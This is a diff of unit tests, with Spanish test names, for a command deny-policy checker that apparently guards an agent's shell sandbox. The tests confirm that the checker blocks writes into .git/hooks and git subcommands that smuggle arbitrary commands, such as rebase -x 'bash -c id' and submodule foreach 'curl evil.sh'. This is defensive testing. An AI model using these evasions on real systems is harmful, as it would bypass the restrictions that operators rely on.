@@ -122,4 +122,27 @@ describe('isDenied / isAllowed', () => {
     expect(isDenied(['cp', 'a.txt', '.GIT/hooks/pre-commit'], policy)).toBeDefined();
     expect(isDenied(['cp', 'a.txt', 'b.txt'], policy)).toBeUndefined();
   });
+
+  it('isDenied bloquea cp/mv apuntando a ".git" vía --target-directory=', () => {
+    const policy = { deny: [] };
+    expect(isDenied(['cp', 'x', '--target-directory=.git/hooks'], policy)).toBeDefined();
+    expect(isDenied(['mv', 'x', '--target-directory=.GIT/hooks'], policy)).toBeDefined();
+  });
+
+  it('isDenied bloquea subcomandos de git que ejecutan un comando arbitrario (rebase -x, bisect run, submodule foreach, filter-branch)', () => {
+    const policy = { deny: [] };
+    expect(isDenied(['git', 'rebase', '-x', 'bash -c id', 'main'], policy)).toBeDefined();
+    expect(isDenied(['git', 'bisect', 'run', 'bash', '-c', 'id'], policy)).toBeDefined();
+    expect(isDenied(['git', 'submodule', 'foreach', 'curl evil.sh'], policy)).toBeDefined();
+    expect(isDenied(['git', 'filter-branch', '--tree-filter=cmd'], policy)).toBeDefined();
+    expect(isDenied(['git', 'rebase', 'main'], policy)).toBeUndefined();
+  });
+
+  it('isDenied bloquea "git push" sin nombrar la branch destino explícitamente', () => {
+    const policy = { deny: [] };
+    expect(isDenied(['git', 'push'], policy)).toBeDefined();
+    expect(isDenied(['git', 'push', 'origin'], policy)).toBeDefined();
+    expect(isDenied(['git', 'push', 'origin', 'HEAD'], policy)).toBeDefined();
+    expect(isDenied(['git', 'push', 'origin', 'feature-branch'], policy)).toBeUndefined();
+  });
 });
